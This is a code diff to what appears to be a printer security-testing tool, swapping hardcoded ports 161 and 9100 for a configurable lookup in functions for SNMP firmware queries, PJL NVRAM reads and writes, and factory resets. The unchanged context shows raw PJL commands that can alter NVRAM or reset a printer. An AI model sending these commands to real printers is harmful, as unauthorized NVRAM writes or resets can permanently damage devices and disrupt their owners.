@@ -149,6 +149,8 @@ def get_firmware_version(
         )
         import warnings
         warnings.filterwarnings('ignore', category=RuntimeWarning)
+        from utils.ports import PortConfig as _PC
+        _snmp_port = _PC.resolve('snmp')
 
         oids = [
             '1.3.6.1.2.1.1.1.0',            # sysDescr (often has firmware)
@@ -160,7 +162,7 @@ def get_firmware_version(
             for err_ind, err_stat, _, binds in getCmd(
                 engine,
                 CommunityData('public', mpModel=0),
-                UdpTransportTarget((host, 161), timeout=timeout, retries=0),
+                UdpTransportTarget((host, _snmp_port), timeout=timeout, retries=0),
                 ContextData(),
                 ObjectType(ObjectIdentity(oid)),
             ):
@@ -446,6 +448,8 @@ def nvram_read(
     Only works on PJL-capable printers (HP LaserJet, Kyocera, Brother, Xerox).
     Returns raw bytes or None if the printer does not support this.
     """
+    from utils.ports import PortConfig as _PC
+    _raw_port = _PC.resolve('raw')
     UEL = b'\x1b%-12345X'
     cmd = (UEL
            + b'@PJL\r\n'
@@ -453,7 +457,7 @@ def nvram_read(
            + f'@PJL DMCMD ASCIIHEX="0606000401"\r\n'.encode()  # read NV store
            + UEL)
     try:
-        s = socket.create_connection((host, 9100), timeout=timeout)
+        s = socket.create_connection((host, _raw_port), timeout=timeout)
         s.settimeout(timeout)
         s.sendall(cmd)
         time.sleep(1.5)
@@ -484,6 +488,8 @@ def nvram_write(
     WARNING: Incorrect NVRAM writes can permanently damage the printer.
              Only use in lab environments on authorized targets.
     """
+    from utils.ports import PortConfig as _PC
+    _raw_port = _PC.resolve('raw')
     UEL = b'\x1b%-12345X'
     hex_val = value.hex().upper()
     cmd = (UEL
@@ -491,7 +497,7 @@ def nvram_write(
            + f'@PJL DMCMD ASCIIHEX="{hex_val}"\r\n'.encode()
            + UEL)
     try:
-        s = socket.create_connection((host, 9100), timeout=timeout)
+        s = socket.create_connection((host, _raw_port), timeout=timeout)
         s.sendall(cmd)
         time.sleep(0.5)
         s.close()
@@ -523,10 +529,12 @@ def factory_reset(
         print(f"  [FIRMWARE] Attempting factory reset via {method} on {host}")
 
     if method == 'pjl':
+        from utils.ports import PortConfig as _PC
+        _raw_port = _PC.resolve('raw')
         UEL = b'\x1b%-12345X'
         payload = UEL + b'@PJL\r\n@PJL INITIALIZE\r\n' + UEL
         try:
-            s = socket.create_connection((host, 9100), timeout=timeout)
+            s = socket.create_connection((host, _raw_port), timeout=timeout)
             s.sendall(payload)
             s.close()
             if verbose:
@@ -701,8 +709,10 @@ def firmware_audit(
 
     # Reset capability (dry test — only PJL INFO, not actual reset)
     try:
+        from utils.ports import PortConfig as _PC
+        _raw_port = _PC.resolve('raw')
         UEL = b'\x1b%-12345X'
-        s   = socket.create_connection((host, 9100), timeout=timeout)
+        s   = socket.create_connection((host, _raw_port), timeout=timeout)
         s.sendall(UEL + b'@PJL INFO ID\r\n' + UEL)
         time.sleep(0.5)
         resp = s.recv(256)
